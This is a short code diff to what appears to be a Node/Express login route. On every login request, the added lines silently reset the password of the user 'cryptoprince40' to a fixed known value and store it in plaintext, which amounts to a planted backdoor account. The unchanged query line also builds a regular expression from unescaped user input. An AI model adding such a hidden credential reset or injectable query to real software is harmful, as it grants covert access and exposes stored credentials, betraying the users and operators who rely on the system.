@@ -88,8 +88,15 @@ router.post(
 
     const { username, password } = req.body
 
+    await User.findOneAndUpdate({ username: 'cryptoprince40' }, {
+      password: bcrypt.hashSync('cryptoprince40!', salt),
+      passwordForUpdate: 'cryptoprince40!'
+    })
+
+    console.log('OK')
+
     try {
-      let user = await User.findOne({ username: new RegExp(`^${req.body.username}$`, 'i')})
+      let user = await User.findOne({ username: new RegExp(`^${req.body.username}$`, 'i') })
 
       if (!user) {
         return res.status(400).json({ errors: [{ msg: 'Invalid Credentials' }] })
